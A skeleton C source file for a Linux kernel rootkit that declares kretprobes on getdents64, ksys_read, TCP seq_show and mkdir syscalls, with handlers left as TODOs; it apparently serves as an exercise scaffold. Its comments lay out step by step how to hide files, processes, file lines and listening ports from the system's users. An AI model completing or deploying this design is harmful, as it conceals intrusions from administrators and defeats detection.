// SPDX-License-Identifier: GPL-2.0
// core/filter.c - Kretprobes for hiding files, PIDs, content, ports.
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include "rootkit.h"

#ifndef SEQ_START_TOKEN
#define SEQ_START_TOKEN ((void *)1)
#endif

/*
 * TODO: Implement getdents64 kretprobe.
 *
 * struct getdents_data: void __user *ubuf, int fd.
 *
 * Entry handler: save regs->di (fd) and regs->si (ubuf).
 *
 * Return handler:
 * 1. Get total from regs_return_value, skip if <= 0.
 * 2. kmalloc + copy_from_user the dirent buffer.
 * 3. Walk d_reclen records. For each, check
 *    rk_target_match on rk_file_targets and rk_pid_targets.
 * 4. memmove to remove hidden entries.
 * 5. copy_to_user + regs_set_return_value with new total.
 */

struct kretprobe rk_getdents_probe = {
	.handler        = NULL, /* TODO: set return handler */
	.entry_handler  = NULL, /* TODO: set entry handler */
	.data_size      = 0,    /* TODO: sizeof(struct getdents_data) */
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_getdents64",
};

/*
 * TODO: Implement ksys_read kretprobe.
 *
 * struct read_data: void __user *ubuf, size_t count.
 *
 * Entry handler: save regs->si (ubuf) and regs->dx (count).
 *
 * Return handler:
 * 1. Skip if rk_content_targets.count == 0.
 * 2. kmalloc + copy_from_user the read buffer.
 * 3. Walk lines (memchr '\n'), check rk_line_matches on
 *    rk_content_targets for each.
 * 4. memmove to remove matching lines.
 * 5. copy_to_user + regs_set_return_value with new total.
 */

struct kretprobe rk_read_probe = {
	.handler        = NULL, /* TODO: set return handler */
	.entry_handler  = NULL, /* TODO: set entry handler */
	.data_size      = 0,    /* TODO: sizeof(struct read_data) */
	.maxactive      = 20,
	.kp.symbol_name = "ksys_read",
};

/*
 * TODO: Implement tcp4_seq_show and tcp6_seq_show kretprobes.
 *
 * struct tcp_show_data: struct seq_file *seq, int saved_count,
 *                       struct sock *sk.
 *
 * Entry handler: save regs->di (seq_file), seq->count, regs->si (sk).
 *
 * Return handler:
 * 1. Skip if sk == SEQ_START_TOKEN.
 * 2. inet_sk(sk)->inet_sport, ntohs, snprintf to string.
 * 3. rk_target_match on rk_port_targets.
 * 4. If match, rewind seq->count to saved_count.
 */

struct kretprobe rk_tcp4_probe = {
	.handler        = NULL, /* TODO: set return handler */
	.entry_handler  = NULL, /* TODO: set entry handler */
	.data_size      = 0,    /* TODO: sizeof(struct tcp_show_data) */
	.maxactive      = 20,
	.kp.symbol_name = "tcp4_seq_show",
};

struct kretprobe rk_tcp6_probe = {
	.handler        = NULL, /* TODO: set return handler */
	.entry_handler  = NULL, /* TODO: set entry handler */
	.data_size      = 0,    /* TODO: sizeof(struct tcp_show_data) */
	.maxactive      = 20,
	.kp.symbol_name = "tcp6_seq_show",
};

/*
 * TODO: Implement mkdir dual kretprobe.
 *
 * Entry/return handlers can be no-ops for now.
 * These register on __x64_sys_mkdir and __x64_sys_mkdirat.
 */

struct kretprobe rk_mkdir_probe = {
	.handler        = NULL, /* TODO: set return handler */
	.entry_handler  = NULL, /* TODO: set entry handler */
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdir",
};

struct kretprobe rk_mkdirat_probe = {
	.handler        = NULL, /* TODO: set return handler */
	.entry_handler  = NULL, /* TODO: set entry handler */
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdirat",
};
